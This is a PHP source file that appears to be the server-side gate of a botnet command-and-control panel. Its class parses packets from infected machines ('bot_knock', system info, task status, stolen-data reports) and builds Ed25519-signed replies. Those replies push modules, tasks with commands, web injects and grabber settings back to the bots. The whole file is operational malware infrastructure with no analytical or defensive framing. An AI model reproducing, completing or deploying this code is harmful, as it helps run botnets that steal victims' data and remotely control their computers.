<?php

require_once 'PacketTypes/PacketTypes.php';
require_once 'PacketTypes/PacketGeneral.php';
require_once 'PacketTypes/PacketKnock.php';
require_once 'PacketTypes/PacketSystemInfo.php';
require_once 'PacketTypes/PacketTaskExecInfo.php';
require_once 'PacketTypes/PacketData.php';
require_once 'PacketTypes/PacketReport.php';
require_once 'PacketTypes/PacketModuleContext.php';
require_once 'PacketTypes/PacketModuleInfo.php';

final class ProtobufProtocolWorker {

    public function parsePacket($packet_data)
    {
        Logger::Trace('ProtobufProtocolWorker (class)', 'parsePacket', 'Start to parse protobuf packet');
        $packet_general = (new PacketGeneral($packet_data))->parsePacket();
        Logger::Trace('ProtobufProtocolWorker (class)', 'parsePacket', 'MessageType = ' . $packet_general['messageType'] . ' | BOTID = ' . $packet_general['uid']);
        switch($packet_general['messageType'])
        {
            case PacketTypes::PacketSystemInfo:
                return $this->parsePacketSystemInfo($packet_general['payload'][0]);
                break;
            case PacketTypes::PacketKnock:
                return $this->parsePacketKnock($packet_general['uid']);
                break;
            case PacketTypes::PacketTaskExecInfo:
                return $this->parsePacketTaskExecInfo($packet_general['payload'][0], $packet_general['uid']);
                break;
            case PacketTypes::PacketReport:
                return $this->parsePacketReport($packet_general['payload'], $packet_general['uid']);
                break;
            case PacketTypes::PacketModule:
                return $this->parsePacketModuleInfo($packet_general['payload'][0], $packet_general['uid']);
                break;
            default:
                // TODO: create some response (will think about it)
                die();
                break;
        }
    }

    public function generateData($uid, $reportPolicy, $coreProtection, $knockTimeout, $modules = null, $tasks = null, $injects = null, $grabberSettings = null)
    {
        Logger::Trace('ProtobufProtocolWorker', 'generateData', '[Start]');

        $packetData = new PacketData();
        $packetData->setSettings($reportPolicy, $coreProtection, $knockTimeout);

        if (!empty($modules) && is_array($modules)) {
            foreach ($modules as $module) {
                $packetData->addModule($module['id'], $module['hash_x32'], $module['hash_x64'], $module['constantly_active']);
            }
        }

        if (!empty($tasks) && is_array($tasks)) {
            foreach ($tasks as $task) {
                $packetData->addTask($task['id'], $task['sid'], $task['command'], $task['context']);
            }
        }

        if (!empty($injects)) {
            $packetData->setInjects($injects);
        }

        if (!empty($grabberSettings)) {
            $packetData->setGrabberSettings($grabberSettings);
        }

        $generatedPacketData = $packetData->generatePacket();
        $generalPacket = new PacketGeneral();
        $generalPacket->addPayload($generatedPacketData);
		
		$fuckingSignature = SignEd25519::sign($generatedPacketData);
		
		if($fuckingSignature == 0)
		{
			Logger::Trace('ProtobufProtocolWorker', 'generateData', 'Signature is null');
		}
		else
		{
			Logger::Trace('ProtobufProtocolWorker', 'generateData-signature', $fuckingSignature);
		}
		
        $generalPacket->addSignature(SignEd25519::sign($generatedPacketData));
        $generalPacket->setMessageType(PacketTypes::PacketData);
        $generalPacket->setUid($uid);

        Logger::Trace('ProtobufProtocolWorker', 'generateData', '[End]');

        return $generalPacket->generatePacket();
    }

    public function generateModuleContext($uid, $ImageX64, $ImageX64Size, $ImageX32, $ImageX32Size)
    {
        Logger::Trace('Model_Gate', 'generateModuleContext', '[Start]');

        $packetModuleCtx = new PacketModuleContext();
        $packetModuleCtx->setContext($ImageX64, $ImageX64Size, $ImageX32, $ImageX32Size);
        $generatedPacketData = $packetModuleCtx->generatePacket();
        $generalPacket = new PacketGeneral();
        $generalPacket->addPayload($generatedPacketData);
        $generalPacket->addSignature(SignEd25519::sign($generatedPacketData));
        $generalPacket->setMessageType(PacketTypes::PacketModuleContext);
        $generalPacket->setUid($uid);

        Logger::Trace('Model_Gate', 'generateModuleContext', '[End]');

        return $generalPacket->generatePacket();
    }

    // TODO: will make it
    private function returnError()
    {
        return array('error', 'error');
    }

    private function parsePacketReport(&$payload_arr, $uid)
    {
        $reports = array();
        foreach ($payload_arr as $payload) {
            $packetData = (new PacketReport($payload))->parsePacket();
            $packetData['botid'] = $uid;
            $reports[] = $packetData;
        }
        return array('action' => 'write_reports', 'data' => $reports);
    }

    private function parsePacketTaskExecInfo(&$data, $uid)
    {
        $packetData = (new PacketTaskExecInfo($data))->parsePacket();
        $packetData['botid'] = $uid;
        return array('action' => 'upd_task_status', 'data' => $packetData);
    }

    private function parsePacketModuleInfo(&$data, $uid)
    {
        $packetData = (new PacketModuleInfo($data))->parsePacket();
        $packetData['botid'] = $uid;
        return array('action' => 'get_module_context', 'data' => $packetData);
    }

    private function parsePacketKnock($uid)
    {
        $data = array('botid' => $uid);
        return array('action' => 'bot_knock', 'data' => $data);
    }

    private function parsePacketSystemInfo(&$data)
    {
        $packetData = (new PacketSystemInfo($data))->parsePacket();
        return array('action' => 'bot_upd_sys_info', 'data' => $packetData);
    }

}